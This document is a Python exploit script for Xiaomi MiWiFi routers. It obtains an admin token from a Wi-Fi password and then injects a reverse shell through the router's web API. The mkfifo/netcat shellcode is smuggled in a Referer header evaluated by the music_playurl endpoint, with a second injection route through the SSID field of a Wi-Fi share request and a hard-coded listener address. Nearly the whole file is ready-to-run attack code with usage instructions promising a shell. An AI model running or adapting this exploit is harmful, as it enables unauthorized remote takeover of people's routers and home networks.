import sys
import pycurl
import io
import urllib.parse
import hashlib
import time
import random
import math
import json


def createnonce(mac):
    varType = 0
    varDeviceId = mac
    varTime = math.floor(time.time())
    varRandom = math.floor(random.random() * 10000)
    return '_'.join([str(varType), varDeviceId, str(varTime), str(varRandom)])


def oldPwd(pwd, nonce):
    key = 'a2ffa5c9be07488bbb04a3a47d3c5f6a'
    sha1obj = hashlib.sha1()
    sha1obj.update((pwd + key).encode())
    p = sha1obj.hexdigest()
    sha1obj1 = hashlib.sha1()
    sha1obj1.update((nonce + p).encode())
    return sha1obj1.hexdigest()

def doLogin(ip, deviceId, pwd):
    url = f"http://{ip}/cgi-bin/luci/api/xqsystem/login"
    nonce = createnonce(deviceId)
    print(f"deviceId is {deviceId}, password is {pwd}")
    post_data_dic = {"username": "admin", 'password': oldPwd(pwd, nonce), 'logtype': '2', 'nonce': nonce}
    crl = pycurl.Curl()
    crl.setopt(pycurl.VERBOSE, 1)
    crl.setopt(pycurl.FOLLOWLOCATION, 1)
    crl.setopt(pycurl.MAXREDIRS, 5)
    crl.setopt(pycurl.CONNECTTIMEOUT, 60)
    crl.setopt(pycurl.TIMEOUT, 300)
    crl.setopt(pycurl.HTTPPROXYTUNNEL, 1)
    crl.fp = io.BytesIO()
    crl.setopt(crl.POSTFIELDS, urllib.parse.urlencode(post_data_dic).encode())
    crl.setopt(pycurl.URL, url)
    crl.setopt(crl.WRITEFUNCTION, crl.fp.write)
    crl.perform()
    result = crl.fp.getvalue().decode()
    r = json.loads(result)
    print(r)
    return r["token"]

def genDeviceId():
    return ":".join([str(int(random.random() * 100)) for x in range(6)])

def getTimeStamp(s):
    return str(time.mktime(time.strptime(s, '%Y-%m-%d %X')))

# def Post(url, post_data_dic):
#     crl = pycurl.Curl()
#     crl.setopt(pycurl.VERBOSE, 1)
#     crl.setopt(pycurl.FOLLOWLOCATION, 1)
#     crl.setopt(pycurl.MAXREDIRS, 5)
#     crl.setopt(pycurl.CONNECTTIMEOUT, 60)
#     crl.setopt(pycurl.TIMEOUT, 300)
#     exploit_payload = "mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 192.168.31.166 9001 >/tmp/p"
#     headers = [
#         f"Referer: {exploit_payload}",  # 命令注入点[4,8](@ref)
#         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"  # 伪装浏览器[1](@ref)
#     ]
#     crl.setopt(pycurl.HTTPHEADER, headers)
#     crl.setopt(pycurl.HTTPPROXYTUNNEL, 1)
#     crl.fp = io.BytesIO()
#     crl.setopt(crl.POSTFIELDS, urllib.parse.urlencode(post_data_dic).encode())
#     crl.setopt(pycurl.URL, url)
#     crl.setopt(crl.WRITEFUNCTION, crl.fp.write)
#     crl.perform()
#     print(crl.fp.getvalue().decode())
def Post(url, post_data_dic):
    crl = pycurl.Curl()
    # 基础配置（保持原有参数）
    crl.setopt(pycurl.VERBOSE, 0)  # 关闭调试输出避免信息泄露[8](@ref)
    crl.setopt(pycurl.FOLLOWLOCATION, 1)
    crl.setopt(pycurl.MAXREDIRS, 5)
    crl.setopt(pycurl.CONNECTTIMEOUT, 60)
    crl.setopt(pycurl.TIMEOUT, 300)
    
    # 注入Referer（关键修改点）
    exploit_payload = "mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 192.168.31.166 9001 >/tmp/p"
    headers = [
        f"Referer: {exploit_payload}",  # 命令注入点[4,8](@ref)
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"  # 伪装浏览器[1](@ref)
    ]
    crl.setopt(pycurl.HTTPHEADER, headers)  # 设置自定义请求头[6,8](@ref)

    # 代理与数据传输配置
    crl.setopt(pycurl.HTTPPROXYTUNNEL, 1)
    crl.fp = io.BytesIO()
    crl.setopt(crl.POSTFIELDS, urllib.parse.urlencode(post_data_dic).encode())
    crl.setopt(pycurl.URL, url)
    crl.setopt(crl.WRITEFUNCTION, crl.fp.write)
    
    try:
        crl.perform()
        print(crl.fp.getvalue().decode())
    except pycurl.error as e:
        print(f"Curl Error: {e.args[1]}")
    finally:
        crl.close()

def doWifiShare(ip, lip, lport, tok):
    url = f"http://{ip}/cgi-bin/luci/;stok={tok}/api/misns/wifi_share_switch"
    shellcode = f"rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/ash -i 2>&1 | nc {lip} {lport} >/tmp/f"
    post_data_dic = {"info": f"{{\"share\":1, \"guest\":1,\"data\":{{\"ssid\":\"   \\\" || {shellcode} || \\\"\",\"encryption\":\"psk2\",\"password\":\"ls -al\"}}}}"}
    Post(url, post_data_dic)

def doGetWifiShareInfo(ip, tok):
    url = f"http://{ip}/cgi-bin/luci/;stok={tok}/api/misns/wifi_share_info"
    post_data_dic = {}
    Post(url, post_data_dic)

def doExec(ip, tok):
    url = f"http://{ip}/cgi-bin/luci/;stok={tok}/api/misns/wifi_share_rent_switch"
    post_data_dic = {}
    Post(url, post_data_dic)
def music_playurl(ip, lip, lport, tok):
    url = f"http://{ip}/cgi-bin/luci/;stok={tok}/api/xqsmarthome/request_mitv"
    shellcode = f"rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/ash -i 2>&1 | nc {lip} {lport} >/tmp/f"
    post_data_dic = {"payload": f'{{"ip":"127.0.0.1","command":"music_playurl","url":"$(eval$IFS$HTTP_REFERER)"}}'}
    Post(url, post_data_dic)


def main():
    if len(sys.argv) != 5:
        print("exp.py wifipwd ipaddress  lip lport")
        return
    wifipwd = sys.argv[1]
    ip = sys.argv[2]
    lip = sys.argv[3]
    lport = sys.argv[4]
    print("[+]Please listen on lport via nc or some tools like that first.")
    print("[+]If exploit successful you will get a shell")
    print(f"[+]Try to gettoken via wifi password {wifipwd} ...")
    tok = doLogin(ip, genDeviceId(), wifipwd)
    time.sleep(2)
    print(f"[+]Token is {tok}")
    time.sleep(2)
    print("[*]Inject shellcode...")
    music_playurl(ip, lip, lport, tok)
    # doWifiShare(ip, lip, lport, tok)
    # time.sleep(2)
    # print("[*]Show share wifi info...")
    # doGetWifiShareInfo(ip, tok)
    # time.sleep(10)
    # print("[*]Exploiting...")
    # doExec(ip, tok)
    # print("[+]You will get miwifi route shell on lport.")


if __name__ == '__main__':
    main()
